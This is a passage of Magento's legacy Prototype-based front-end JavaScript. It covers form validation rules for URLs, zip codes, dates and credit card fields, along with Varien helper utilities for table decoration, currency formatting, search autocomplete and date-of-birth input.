                return Validation.get('IsEmpty').test(v) || /^(http|https|ftp):\/\/(([A-Z0-9][A-Z0-9_-]*)(\.[A-Z0-9][A-Z0-9_-]*)+.(com|org|net|dk|at|us|tv|info|uk|co.uk|biz|se)$)(:(\d+))?\/?/i.test(v) || /^(www)((\.[A-Z0-9][A-Z0-9_-]*)+.(com|org|net|dk|at|us|tv|info|uk|co.uk|biz|se)$)(:(\d+))?\/?/i.test(v)
            }],
    ['validate-identifier', 'Please enter a valid URL Key. For example "example-page", "example-page.html" or "anotherlevel/example-page".', function (v) {
                return Validation.get('IsEmpty').test(v) || /^[a-z0-9][a-z0-9_\/-]+(\.[a-z0-9_-]+)?$/.test(v)
            }],
    ['validate-xml-identifier', 'Please enter a valid XML-identifier. For example something_1, block5, id-4.', function (v) {
                return Validation.get('IsEmpty').test(v) || /^[A-Z][A-Z0-9_\/-]*$/i.test(v)
            }],
    ['validate-ssn', 'Please enter a valid social security number. For example 123-45-6789.', function(v) {
            return Validation.get('IsEmpty').test(v) || /^\d{3}-?\d{2}-?\d{4}$/.test(v);
            }],
    ['validate-zip', 'Please enter a valid zip code. For example 90602 or 90602-1234.', function(v) {
            return Validation.get('IsEmpty').test(v) || /(^\d{5}$)|(^\d{5}-\d{4}$)/.test(v);
            }],
    ['validate-zip-international', 'Please enter a valid zip code.', function(v) {
            //return Validation.get('IsEmpty').test(v) || /(^[A-z0-9]{2,10}([\s]{0,1}|[\-]{0,1})[A-z0-9]{2,10}$)/.test(v);
            return true;
            }],
    ['validate-date-au', 'Please use this date format: dd/mm/yyyy. For example 17/03/2006 for the 17th of March, 2006.', function(v) {
                if(Validation.get('IsEmpty').test(v)) return true;
                var regex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
                if(!regex.test(v)) return false;
                var d = new Date(v.replace(regex, '$2/$1/$3'));
                return ( parseInt(RegExp.$2, 10) == (1+d.getMonth()) ) &&
                            (parseInt(RegExp.$1, 10) == d.getDate()) &&
                            (parseInt(RegExp.$3, 10) == d.getFullYear() );
            }],
    ['validate-currency-dollar', 'Please enter a valid $ amount. For example $100.00.', function(v) {
                // [$]1[##][,###]+[.##]
                // [$]1###+[.##]
                // [$]0.##
                // [$].##
                return Validation.get('IsEmpty').test(v) ||  /^\$?\-?([1-9]{1}[0-9]{0,2}(\,[0-9]{3})*(\.[0-9]{0,2})?|[1-9]{1}\d*(\.[0-9]{0,2})?|0(\.[0-9]{0,2})?|(\.[0-9]{1,2})?)$/.test(v)
            }],
    ['validate-one-required', 'Please select one of the above options.', function (v,elm) {
                var p = elm.parentNode;
                var options = p.getElementsByTagName('INPUT');
                return $A(options).any(function(elm) {
                    return $F(elm);
                });
            }],
    ['validate-one-required-by-name', 'Please select one of the options.', function (v,elm) {
                var inputs = $$('input[name="' + elm.name.replace(/([\\"])/g, '\\$1') + '"]');

                var error = 1;
                for(var i=0;i<inputs.length;i++) {
                    if((inputs[i].type == 'checkbox' || inputs[i].type == 'radio') && inputs[i].checked == true) {
                        error = 0;
                    }

                    if(Validation.isOnChange && (inputs[i].type == 'checkbox' || inputs[i].type == 'radio')) {
                        Validation.reset(inputs[i]);
                    }
                }

                if( error == 0 ) {
                    return true;
                } else {
                    return false;
                }
            }],
    ['validate-not-negative-number', 'Please enter a number 0 or greater in this field.', function(v) {
                if (Validation.get('IsEmpty').test(v)) {
                    return true;
                }
                v = parseNumber(v);
                return !isNaN(v) && v >= 0;
            }],
    ['validate-zero-or-greater', 'Please enter a number 0 or greater in this field.', function(v) {
            return Validation.get('validate-not-negative-number').test(v);
        }],
    ['validate-greater-than-zero', 'Please enter a number greater than 0 in this field.', function(v) {
            if (Validation.get('IsEmpty').test(v)) {
                return true;
            }
            v = parseNumber(v);
            return !isNaN(v) && v > 0;
        }],
    ['validate-state', 'Please select State/Province.', function(v) {
                return (v!=0 || v == '');
            }],
    ['validate-new-password', 'Please enter 6 or more characters. Leading or trailing spaces will be ignored.', function(v) {
                if (!Validation.get('validate-password').test(v)) return false;
                if (Validation.get('IsEmpty').test(v) && v != '') return false;
                return true;
            }],
    ['validate-cc-number', 'Please enter a valid credit card number.', function(v, elm) {
                // remove non-numerics
                var ccTypeContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_number')) + '_cc_type');
                if (ccTypeContainer && typeof Validation.creditCartTypes.get(ccTypeContainer.value) != 'undefined'
                        && Validation.creditCartTypes.get(ccTypeContainer.value)[2] == false) {
                    if (!Validation.get('IsEmpty').test(v) && Validation.get('validate-digits').test(v)) {
                        return true;
                    } else {
                        return false;
                    }
                }
                return validateCreditCard(v);
            }],
    ['validate-cc-type', 'Credit card number does not match credit card type.', function(v, elm) {
                // remove credit card number delimiters such as "-" and space
                elm.value = removeDelimiters(elm.value);
                v         = removeDelimiters(v);

                var ccTypeContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_number')) + '_cc_type');
                if (!ccTypeContainer) {
                    return true;
                }
                var ccType = ccTypeContainer.value;

                if (typeof Validation.creditCartTypes.get(ccType) == 'undefined') {
                    return false;
                }

                // Other card type or switch or solo card
                if (Validation.creditCartTypes.get(ccType)[0]==false) {
                    return true;
                }

                var validationFailure = false;
                Validation.creditCartTypes.each(function (pair) {
                    if (pair.key == ccType) {
                        if (pair.value[0] && !v.match(pair.value[0])) {
                            validationFailure = true;
                        }
                        throw $break;
                    }
                });

                if (validationFailure) {
                    return false;
                }

                if (ccTypeContainer.hasClassName('validation-failed') && Validation.isOnChange) {
                    Validation.validate(ccTypeContainer);
                }

                return true;
            }],
     ['validate-cc-type-select', 'Card type does not match credit card number.', function(v, elm) {
                var ccNumberContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_type')) + '_cc_number');
                if (Validation.isOnChange && Validation.get('IsEmpty').test(ccNumberContainer.value)) {
                    return true;
                }
                if (Validation.get('validate-cc-type').test(ccNumberContainer.value, ccNumberContainer)) {
                    Validation.validate(ccNumberContainer);
                }
                return Validation.get('validate-cc-type').test(ccNumberContainer.value, ccNumberContainer);
            }],
     ['validate-cc-exp', 'Incorrect credit card expiration date.', function(v, elm) {
                var ccExpMonth   = v;
                var ccExpYear    = $(elm.id.substr(0,elm.id.indexOf('_expiration')) + '_expiration_yr').value;
                var currentTime  = new Date();
                var currentMonth = currentTime.getMonth() + 1;
                var currentYear  = currentTime.getFullYear();
                if (ccExpMonth < currentMonth && ccExpYear == currentYear) {
                    return false;
                }
                return true;
            }],
     ['validate-cc-cvn', 'Please enter a valid credit card verification number.', function(v, elm) {
                var ccTypeContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_cid')) + '_cc_type');
                if (!ccTypeContainer) {
                    return true;
                }
                var ccType = ccTypeContainer.value;

                if (typeof Validation.creditCartTypes.get(ccType) == 'undefined') {
                    return false;
                }

                var re = Validation.creditCartTypes.get(ccType)[1];

                if (v.match(re)) {
                    return true;
                }

                return false;
            }],
     ['validate-ajax', '', function(v, elm) { return true; }],
     ['validate-data', 'Please use only letters (a-z or A-Z), numbers (0-9) or underscore(_) in this field, first character should be a letter.', function (v) {
                if(v != '' && v) {
                    return /^[A-Za-z]+[A-Za-z0-9_]+$/.test(v);
                }
                return true;
            }],
     ['validate-css-length', 'Please input a valid CSS-length. For example 100px or 77pt or 20em or .5ex or 50%.', function (v) {
                if (v != '' && v) {
                    return /^[0-9\.]+(px|pt|em|ex|%)?$/.test(v) && (!(/\..*\./.test(v))) && !(/\.$/.test(v));
                }
                return true;
            }],
     ['validate-length', 'Text length does not satisfy specified text range.', function (v, elm) {
                var reMax = new RegExp(/^maximum-length-[0-9]+$/);
                var reMin = new RegExp(/^minimum-length-[0-9]+$/);
                var result = true;
                $w(elm.className).each(function(name, index) {
                    if (name.match(reMax) && result) {
                       var length = name.split('-')[2];
                       result = (v.length <= length);
                    }
                    if (name.match(reMin) && result && !Validation.get('IsEmpty').test(v)) {
                        var length = name.split('-')[2];
                        result = (v.length >= length);
                    }
                });
                return result;
            }],
     ['validate-percents', 'Please enter a number lower than 100.', {max:100}],
     ['required-file', 'Please select a file', function(v, elm) {
         var result = !Validation.get('IsEmpty').test(v);
         if (result === false) {
             ovId = elm.id + '_value';
             if ($(ovId)) {
                 result = !Validation.get('IsEmpty').test($(ovId).value);
             }
         }
         return result;
     }],
     ['validate-cc-ukss', 'Please enter issue number or start date for switch/solo card type.', function(v,elm) {
         var endposition;

         if (elm.id.match(/(.)+_cc_issue$/)) {
             endposition = elm.id.indexOf('_cc_issue');
         } else if (elm.id.match(/(.)+_start_month$/)) {
             endposition = elm.id.indexOf('_start_month');
         } else {
             endposition = elm.id.indexOf('_start_year');
         }

         var prefix = elm.id.substr(0,endposition);

         var ccTypeContainer = $(prefix + '_cc_type');

         if (!ccTypeContainer) {
               return true;
         }
         var ccType = ccTypeContainer.value;

         if(['SS','SM','SO'].indexOf(ccType) == -1){
             return true;
         }

         $(prefix + '_cc_issue').advaiceContainer
           = $(prefix + '_start_month').advaiceContainer
           = $(prefix + '_start_year').advaiceContainer
           = $(prefix + '_cc_type_ss_div').down('ul li.adv-container');

         var ccIssue   =  $(prefix + '_cc_issue').value;
         var ccSMonth  =  $(prefix + '_start_month').value;
         var ccSYear   =  $(prefix + '_start_year').value;

         var ccStartDatePresent = (ccSMonth && ccSYear) ? true : false;

         if (!ccStartDatePresent && !ccIssue){
             return false;
         }
         return true;
     }]
]);

function removeDelimiters (v) {
    v = v.replace(/\s/g, '');
    v = v.replace(/\-/g, '');
    return v;
}

function parseNumber(v)
{
    if (typeof v != 'string') {
        return parseFloat(v);
    }

    var isDot  = v.indexOf('.');
    var isComa = v.indexOf(',');

    if (isDot != -1 && isComa != -1) {
        if (isComa > isDot) {
            v = v.replace('.', '').replace(',', '.');
        }
        else {
            v = v.replace(',', '');
        }
    }
    else if (isComa != -1) {
        v = v.replace(',', '.');
    }

    return parseFloat(v);
}

/**
 * Hash with credit card types which can be simply extended in payment modules
 * 0 - regexp for card number
 * 1 - regexp for cvn
 * 2 - check or not credit card number trough Luhn algorithm by
 *     function validateCreditCard which you can find above in this file
 */
Validation.creditCartTypes = $H({
//    'SS': [new RegExp('^((6759[0-9]{12})|(5018|5020|5038|6304|6759|6761|6763[0-9]{12,19})|(49[013][1356][0-9]{12})|(6333[0-9]{12})|(6334[0-4]\d{11})|(633110[0-9]{10})|(564182[0-9]{10}))([0-9]{2,3})?$'), new RegExp('^([0-9]{3}|[0-9]{4})?$'), true],
    'SO': [new RegExp('^(6334[5-9]([0-9]{11}|[0-9]{13,14}))|(6767([0-9]{12}|[0-9]{14,15}))$'), new RegExp('^([0-9]{3}|[0-9]{4})?$'), true],
    'VI': [new RegExp('^4[0-9]{12}([0-9]{3})?$'), new RegExp('^[0-9]{3}$'), true],
    'MC': [new RegExp('^5[1-5][0-9]{14}$'), new RegExp('^[0-9]{3}$'), true],
    'AE': [new RegExp('^3[47][0-9]{13}$'), new RegExp('^[0-9]{4}$'), true],
    'DI': [new RegExp('^(30[0-5][0-9]{13}|3095[0-9]{12}|35(2[8-9][0-9]{12}|[3-8][0-9]{13})|36[0-9]{12}|3[8-9][0-9]{14}|6011(0[0-9]{11}|[2-4][0-9]{11}|74[0-9]{10}|7[7-9][0-9]{10}|8[6-9][0-9]{10}|9[0-9]{11})|62(2(12[6-9][0-9]{10}|1[3-9][0-9]{11}|[2-8][0-9]{12}|9[0-1][0-9]{11}|92[0-5][0-9]{10})|[4-6][0-9]{13}|8[2-8][0-9]{12})|6(4[4-9][0-9]{13}|5[0-9]{14}))$'), new RegExp('^[0-9]{3}$'), true],
    'JCB': [new RegExp('^(30[0-5][0-9]{13}|3095[0-9]{12}|35(2[8-9][0-9]{12}|[3-8][0-9]{13})|36[0-9]{12}|3[8-9][0-9]{14}|6011(0[0-9]{11}|[2-4][0-9]{11}|74[0-9]{10}|7[7-9][0-9]{10}|8[6-9][0-9]{10}|9[0-9]{11})|62(2(12[6-9][0-9]{10}|1[3-9][0-9]{11}|[2-8][0-9]{12}|9[0-1][0-9]{11}|92[0-5][0-9]{10})|[4-6][0-9]{13}|8[2-8][0-9]{12})|6(4[4-9][0-9]{13}|5[0-9]{14}))$'), new RegExp('^[0-9]{3,4}$'), true],
    'DICL': [new RegExp('^(30[0-5][0-9]{13}|3095[0-9]{12}|35(2[8-9][0-9]{12}|[3-8][0-9]{13})|36[0-9]{12}|3[8-9][0-9]{14}|6011(0[0-9]{11}|[2-4][0-9]{11}|74[0-9]{10}|7[7-9][0-9]{10}|8[6-9][0-9]{10}|9[0-9]{11})|62(2(12[6-9][0-9]{10}|1[3-9][0-9]{11}|[2-8][0-9]{12}|9[0-1][0-9]{11}|92[0-5][0-9]{10})|[4-6][0-9]{13}|8[2-8][0-9]{12})|6(4[4-9][0-9]{13}|5[0-9]{14}))$'), new RegExp('^[0-9]{3}$'), true],
    'SM': [new RegExp('(^(5[0678])[0-9]{11,18}$)|(^(6[^05])[0-9]{11,18}$)|(^(601)[^1][0-9]{9,16}$)|(^(6011)[0-9]{9,11}$)|(^(6011)[0-9]{13,16}$)|(^(65)[0-9]{11,13}$)|(^(65)[0-9]{15,18}$)|(^(49030)[2-9]([0-9]{10}$|[0-9]{12,13}$))|(^(49033)[5-9]([0-9]{10}$|[0-9]{12,13}$))|(^(49110)[1-2]([0-9]{10}$|[0-9]{12,13}$))|(^(49117)[4-9]([0-9]{10}$|[0-9]{12,13}$))|(^(49118)[0-2]([0-9]{10}$|[0-9]{12,13}$))|(^(4936)([0-9]{12}$|[0-9]{14,15}$))'), new RegExp('^([0-9]{3}|[0-9]{4})?$'), true],
    'OT': [false, new RegExp('^([0-9]{3}|[0-9]{4})?$'), false]
});

/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Varien
 * @package     js
 * @copyright   Copyright (c) 2006-2015 X.commerce, Inc. (http://www.magento.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */
function popWin(url,win,para) {
    var win = window.open(url,win,para);
    win.focus();
}

function setLocation(url){
    window.location.href = url;
}

function setPLocation(url, setFocus){
    if( setFocus ) {
        window.opener.focus();
    }
    window.opener.location.href = url;
}

function setLanguageCode(code, fromCode){
    //TODO: javascript cookies have different domain and path than php cookies
    var href = window.location.href;
    var after = '', dash;
    if (dash = href.match(/\#(.*)$/)) {
        href = href.replace(/\#(.*)$/, '');
        after = dash[0];
    }

    if (href.match(/[?]/)) {
        var re = /([?&]store=)[a-z0-9_]*/;
        if (href.match(re)) {
            href = href.replace(re, '$1'+code);
        } else {
            href += '&store='+code;
        }

        var re = /([?&]from_store=)[a-z0-9_]*/;
        if (href.match(re)) {
            href = href.replace(re, '');
        }
    } else {
        href += '?store='+code;
    }
    if (typeof(fromCode) != 'undefined') {
        href += '&from_store='+fromCode;
    }
    href += after;

    setLocation(href);
}

/**
 * Add classes to specified elements.
 * Supported classes are: 'odd', 'even', 'first', 'last'
 *
 * @param elements - array of elements to be decorated
 * [@param decorateParams] - array of classes to be set. If omitted, all available will be used
 */
function decorateGeneric(elements, decorateParams)
{
    var allSupportedParams = ['odd', 'even', 'first', 'last'];
    var _decorateParams = {};
    var total = elements.length;

    if (total) {
        // determine params called
        if (typeof(decorateParams) == 'undefined') {
            decorateParams = allSupportedParams;
        }
        if (!decorateParams.length) {
            return;
        }
        for (var k in allSupportedParams) {
            _decorateParams[allSupportedParams[k]] = false;
        }
        for (var k in decorateParams) {
            _decorateParams[decorateParams[k]] = true;
        }

        // decorate elements
        // elements[0].addClassName('first'); // will cause bug in IE (#5587)
        if (_decorateParams.first) {
            Element.addClassName(elements[0], 'first');
        }
        if (_decorateParams.last) {
            Element.addClassName(elements[total-1], 'last');
        }
        for (var i = 0; i < total; i++) {
            if ((i + 1) % 2 == 0) {
                if (_decorateParams.even) {
                    Element.addClassName(elements[i], 'even');
                }
            }
            else {
                if (_decorateParams.odd) {
                    Element.addClassName(elements[i], 'odd');
                }
            }
        }
    }
}

/**
 * Decorate table rows and cells, tbody etc
 * @see decorateGeneric()
 */
function decorateTable(table, options) {
    var table = $(table);
    if (table) {
        // set default options
        var _options = {
            'tbody'    : false,
            'tbody tr' : ['odd', 'even', 'first', 'last'],
            'thead tr' : ['first', 'last'],
            'tfoot tr' : ['first', 'last'],
            'tr td'    : ['last']
        };
        // overload options
        if (typeof(options) != 'undefined') {
            for (var k in options) {
                _options[k] = options[k];
            }
        }
        // decorate
        if (_options['tbody']) {
            decorateGeneric(table.select('tbody'), _options['tbody']);
        }
        if (_options['tbody tr']) {
            decorateGeneric(table.select('tbody tr'), _options['tbody tr']);
        }
        if (_options['thead tr']) {
            decorateGeneric(table.select('thead tr'), _options['thead tr']);
        }
        if (_options['tfoot tr']) {
            decorateGeneric(table.select('tfoot tr'), _options['tfoot tr']);
        }
        if (_options['tr td']) {
            var allRows = table.select('tr');
            if (allRows.length) {
                for (var i = 0; i < allRows.length; i++) {
                    decorateGeneric(allRows[i].getElementsByTagName('TD'), _options['tr td']);
                }
            }
        }
    }
}

/**
 * Set "odd", "even" and "last" CSS classes for list items
 * @see decorateGeneric()
 */
function decorateList(list, nonRecursive) {
    if ($(list)) {
        if (typeof(nonRecursive) == 'undefined') {
            var items = $(list).select('li')
        }
        else {
            var items = $(list).childElements();
        }
        decorateGeneric(items, ['odd', 'even', 'last']);
    }
}

/**
 * Set "odd", "even" and "last" CSS classes for list items
 * @see decorateGeneric()
 */
function decorateDataList(list) {
    list = $(list);
    if (list) {
        decorateGeneric(list.select('dt'), ['odd', 'even', 'last']);
        decorateGeneric(list.select('dd'), ['odd', 'even', 'last']);
    }
}

/**
 * Parse SID and produces the correct URL
 */
function parseSidUrl(baseUrl, urlExt) {
    var sidPos = baseUrl.indexOf('/?SID=');
    var sid = '';
    urlExt = (urlExt != undefined) ? urlExt : '';

    if(sidPos > -1) {
        sid = '?' + baseUrl.substring(sidPos + 2);
        baseUrl = baseUrl.substring(0, sidPos + 1);
    }

    return baseUrl+urlExt+sid;
}

/**
 * Formats currency using patern
 * format - JSON (pattern, decimal, decimalsDelimeter, groupsDelimeter)
 * showPlus - true (always show '+'or '-'),
 *      false (never show '-' even if number is negative)
 *      null (show '-' if number is negative)
 */

function formatCurrency(price, format, showPlus){
    var precision = isNaN(format.precision = Math.abs(format.precision)) ? 2 : format.precision;
    var requiredPrecision = isNaN(format.requiredPrecision = Math.abs(format.requiredPrecision)) ? 2 : format.requiredPrecision;

    //precision = (precision > requiredPrecision) ? precision : requiredPrecision;
    //for now we don't need this difference so precision is requiredPrecision
    precision = requiredPrecision;

    var integerRequired = isNaN(format.integerRequired = Math.abs(format.integerRequired)) ? 1 : format.integerRequired;

    var decimalSymbol = format.decimalSymbol == undefined ? "," : format.decimalSymbol;
    var groupSymbol = format.groupSymbol == undefined ? "." : format.groupSymbol;
    var groupLength = format.groupLength == undefined ? 3 : format.groupLength;

    var s = '';

    if (showPlus == undefined || showPlus == true) {
        s = price < 0 ? "-" : ( showPlus ? "+" : "");
    } else if (showPlus == false) {
        s = '';
    }

    var i = parseInt(price = Math.abs(+price || 0).toFixed(precision)) + "";
    var pad = (i.length < integerRequired) ? (integerRequired - i.length) : 0;
    while (pad) { i = '0' + i; pad--; }
    j = (j = i.length) > groupLength ? j % groupLength : 0;
    re = new RegExp("(\\d{" + groupLength + "})(?=\\d)", "g");

    /**
     * replace(/-/, 0) is only for fixing Safari bug which appears
     * when Math.abs(0).toFixed() executed on "0" number.
     * Result is "0.-0" :(
     */
    var r = (j ? i.substr(0, j) + groupSymbol : "") + i.substr(j).replace(re, "$1" + groupSymbol) + (precision ? decimalSymbol + Math.abs(price - i).toFixed(precision).replace(/-/, 0).slice(2) : "")
    var pattern = '';
    if (format.pattern.indexOf('{sign}') == -1) {
        pattern = s + format.pattern;
    } else {
        pattern = format.pattern.replace('{sign}', s);
    }

    return pattern.replace('%s', r).replace(/^\s\s*/, '').replace(/\s\s*$/, '');
};

function expandDetails(el, childClass) {
    if (Element.hasClassName(el,'show-details')) {
        $$(childClass).each(function(item){item.hide()});
        Element.removeClassName(el,'show-details');
    }
    else {
        $$(childClass).each(function(item){item.show()});
        Element.addClassName(el,'show-details');
    }
}

// Version 1.0
var isIE = navigator.appVersion.match(/MSIE/) == "MSIE";

if (!window.Varien)
    var Varien = new Object();

Varien.showLoading = function(){
    var loader = $('loading-process');
    loader && loader.show();
}
Varien.hideLoading = function(){
    var loader = $('loading-process');
    loader && loader.hide();
}
Varien.GlobalHandlers = {
    onCreate: function() {
        Varien.showLoading();
    },

    onComplete: function() {
        if(Ajax.activeRequestCount == 0) {
            Varien.hideLoading();
        }
    }
};

Ajax.Responders.register(Varien.GlobalHandlers);

/**
 * Quick Search form client model
 */
Varien.searchForm = Class.create();
Varien.searchForm.prototype = {
    initialize : function(form, field, emptyText){
        this.form   = $(form);
        this.field  = $(field);
        this.emptyText = emptyText;

        Event.observe(this.form,  'submit', this.submit.bind(this));
        Event.observe(this.field, 'focus', this.focus.bind(this));
        Event.observe(this.field, 'blur', this.blur.bind(this));
        this.blur();
    },

    submit : function(event){
        if (this.field.value == this.emptyText || this.field.value == ''){
            Event.stop(event);
            return false;
        }
        return true;
    },

    focus : function(event){
        if(this.field.value==this.emptyText){
            this.field.value='';
        }

    },

    blur : function(event){
        if(this.field.value==''){
            this.field.value=this.emptyText;
        }
    },

    initAutocomplete : function(url, destinationElement){
        new Ajax.Autocompleter(
            this.field,
            destinationElement,
            url,
            {
                paramName: this.field.name,
                method: 'get',
                minChars: 2,
                updateElement: this._selectAutocompleteItem.bind(this),
                onShow : function(element, update) {
                    if(!update.style.position || update.style.position=='absolute') {
                        update.style.position = 'absolute';
                        Position.clone(element, update, {
                            setHeight: false,
                            offsetTop: element.offsetHeight
                        });
                    }
                    Effect.Appear(update,{duration:0});
                }

            }
        );
    },

    _selectAutocompleteItem : function(element){
        if(element.title){
            this.field.value = element.title;
        }
        this.form.submit();
    }
}

Varien.Tabs = Class.create();
Varien.Tabs.prototype = {
  initialize: function(selector) {
    var self=this;
    $$(selector+' a').each(this.initTab.bind(this));
  },

  initTab: function(el) {
      el.href = 'javascript:void(0)';
      if ($(el.parentNode).hasClassName('active')) {
        this.showContent(el);
      }
      el.observe('click', this.showContent.bind(this, el));
  },

  showContent: function(a) {
    var li = $(a.parentNode), ul = $(li.parentNode);
    ul.getElementsBySelector('li', 'ol').each(function(el){
      var contents = $(el.id+'_contents');
      if (el==li) {
        el.addClassName('active');
        contents.show();
      } else {
        el.removeClassName('active');
        contents.hide();
      }
    });
  }
}

Varien.DateElement = Class.create();
Varien.DateElement.prototype = {
    initialize: function(type, content, required, format) {
        if (type == 'id') {
            // id prefix
            this.day    = $(content + 'day');
            this.month  = $(content + 'month');
            this.year   = $(content + 'year');
            this.full   = $(content + 'full');
            this.advice = $(content + 'date-advice');
        } else if (type == 'container') {
            // content must be container with data
            this.day    = content.day;
            this.month  = content.month;
            this.year   = content.year;
            this.full   = content.full;
            this.advice = content.advice;
        } else {
            return;
        }

        this.required = required;
        this.format   = format;

        this.day.addClassName('validate-custom');
        this.day.validate = this.validate.bind(this);
        this.month.addClassName('validate-custom');
        this.month.validate = this.validate.bind(this);
        this.year.addClassName('validate-custom');
        this.year.validate = this.validate.bind(this);

        this.setDateRange(false, false);
        this.year.setAttribute('autocomplete','off');

        this.advice.hide();
    },
    validate: function() {
        var error = false,
            day   = parseInt(this.day.value, 10)   || 0,
            month = parseInt(this.month.value, 10) || 0,
            year  = parseInt(this.year.value, 10)  || 0;
        if (this.day.value.strip().empty()
            && this.month.value.strip().empty()
            && this.year.value.strip().empty()
        ) {
            if (this.required) {
                error = 'This date is a required value.';
            } else {
                this.full.value = '';
            }
        } else if (!day || !month || !year) {
            error = 'Please enter a valid full date.';
        } else {
            var date = new Date, countDaysInMonth = 0, errorType = null;
            date.setYear(year);date.setMonth(month-1);date.setDate(32);
            countDaysInMonth = 32 - date.getDate();
            if(!countDaysInMonth || countDaysInMonth>31) countDaysInMonth = 31;

            if (day<1 || day>countDaysInMonth) {
                errorType = 'day';
                error = 'Please enter a valid day (1-%d).';
            } else if (month<1 || month>12) {
                errorType = 'month';
                error = 'Please enter a valid month (1-12).';
            } else {
                if(day % 10 == day) this.day.value = '0'+day;
                if(month % 10 == month) this.month.value = '0'+month;
                this.full.value = this.format.replace(/%[mb]/i, this.month.value).replace(/%[de]/i, this.day.value).replace(/%y/i, this.year.value);
                var testFull = this.month.value + '/' + this.day.value + '/'+ this.year.value;
                var test = new Date(testFull);
                if (isNaN(test)) {
                    error = 'Please enter a valid date.';
                } else {
                    this.setFullDate(test);
                }
            }
            var valueError = false;
            if (!error && !this.validateData()){//(year<1900 || year>curyear) {
                errorType = this.validateDataErrorType;//'year';
                valueError = this.validateDataErrorText;//'Please enter a valid year (1900-%d).';
                error = valueError;
            }
        }

        if (error !== false) {
            try {
                error = Translator.translate(error);
            }
            catch (e) {}
            if (!valueError) {
                this.advice.innerHTML = error.replace('%d', countDaysInMonth);
            } else {
                this.advice.innerHTML = this.errorTextModifier(error);
            }
            this.advice.show();
            return false;
        }

        // fixing elements class
        this.day.removeClassName('validation-failed');
        this.month.removeClassName('validation-failed');
        this.year.removeClassName('validation-failed');

        this.advice.hide();
        return true;
    },
    validateData: function() {
        var year = this.fullDate.getFullYear();
        var date = new Date;
        this.curyear = date.getFullYear();
        return (year>=1900 && year<=this.curyear);
    },
    validateDataErrorType: 'year',
    validateDataErrorText: 'Please enter a valid year (1900-%d).',
    errorTextModifier: function(text) {
        return text.replace('%d', this.curyear);
    },
    setDateRange: function(minDate, maxDate) {
        this.minDate = minDate;
        this.maxDate = maxDate;
    },
    setFullDate: function(date) {
        this.fullDate = date;
    }
};

Varien.DOB = Class.create();
Varien.DOB.prototype = {
    initialize: function(selector, required, format) {
        var el = $$(selector)[0];
        var container       = {};
        container.day       = Element.select(el, '.dob-day input')[0];
        container.month     = Element.select(el, '.dob-month input')[0];
        container.year      = Element.select(el, '.dob-year input')[0];
        container.full      = Element.select(el, '.dob-full input')[0];
        container.advice    = Element.select(el, '.validation-advice')[0];

        new Varien.DateElement('container', container, required, format);
    }
};

Varien.dateRangeDate = Class.create();
Varien.dateRangeDate.prototype = Object.extend(new Varien.DateElement(), {
    validateData: function() {
        var validate = true;
        if (this.minDate || this.maxValue) {
            if (this.minDate) {
                this.minDate = new Date(this.minDate);
                this.minDate.setHours(0);
                if (isNaN(this.minDate)) {
                    this.minDate = new Date('1/1/1900');
                }
                validate = validate && (this.fullDate >= this.minDate)
            }
            if (this.maxDate) {
                this.maxDate = new Date(this.maxDate)
                this.minDate.setHours(0);
                if (isNaN(this.maxDate)) {
                    this.maxDate = new Date();
                }
                validate = validate && (this.fullDate <= this.maxDate)
            }
            if (this.maxDate && this.minDate) {
                this.validateDataErrorText = 'Please enter a valid date between %s and %s';
            } else if (this.maxDate) {
                this.validateDataErrorText = 'Please enter a valid date less than or equal to %s';
            } else if (this.minDate) {
                this.validateDataErrorText = 'Please enter a valid date equal to or greater than %s';
            } else {
                this.validateDataErrorText = '';
            }
        }
        return validate;
    },
    validateDataErrorText: 'Date should be between %s and %s',
    errorTextModifier: function(text) {
        if (this.minDate) {
            text = text.sub('%s', this.dateFormat(this.minDate));
        }
        if (this.maxDate) {
            text = text.sub('%s', this.dateFormat(this.maxDate));
        }
        return text;
    },
    dateFormat: function(date) {
        return (date.getMonth() + 1) + '/' + date.getDate() + '/' + date.getFullYear();
    }
});

Varien.FileElement = Class.create();
Varien.FileElement.prototype = {
    initialize: function (id) {
        this.fileElement = $(id);
        this.hiddenElement = $(id + '_value');

        this.fileElement.observe('change', this.selectFile.bind(this));
    },
    selectFile: function(event) {
        this.hiddenElement.value = this.fileElement.getValue();
    }
};

Validation.addAllThese([
    ['validate-custom', ' ', function(v,elm) {
        return elm.validate();
    }]
]);

function truncateOptions() {
    $$('.truncated').each(function(element){
        Event.observe(element, 'mouseover', function(){
            if (element.down('div.truncated_full_value')) {
                element.down('div.truncated_full_value').addClassName('show')
            }
        });
        Event.observe(element, 'mouseout', function(){
            if (element.down('div.truncated_full_value')) {
                element.down('div.truncated_full_value').removeClassName('show')
            }
        });

    });
}
Event.observe(window, 'load', function(){
   truncateOptions();
});

Element.addMethods({
    getInnerText: function(element)
    {
        element = $(element);
        if(element.innerText && !Prototype.Browser.Opera) {
            return element.innerText
        }
        return element.innerHTML.stripScripts().unescapeHTML().replace(/[\n\r\s]+/g, ' ').strip();
    }
});

/*
if (!("console" in window) || !("firebug" in console))
{
    var names = ["log", "debug", "info", "warn", "error", "assert", "dir", "dirxml",
    "group", "groupEnd", "time", "timeEnd", "count", "trace", "profile", "profileEnd"];

    window.console = {};
    for (var i = 0; i < names.length; ++i)
        window.console[names[i]] = function() {}
}
*/

/**
 * Executes event handler on the element. Works with event handlers attached by Prototype,
 * in a browser-agnostic fashion.
 * @param element The element object
 * @param event Event name, like 'change'
 *
 * @example fireEvent($('my-input', 'click'));
 */
function fireEvent(element, event) {
    if (document.createEvent) {
        // dispatch for all browsers except IE before version 9
        var evt = document.createEvent("HTMLEvents");
        evt.initEvent(event, true, true ); // event type, bubbling, cancelable
        return element.dispatchEvent(evt);
    } else {
        // dispatch for IE before version 9
        var evt = document.createEventObject();
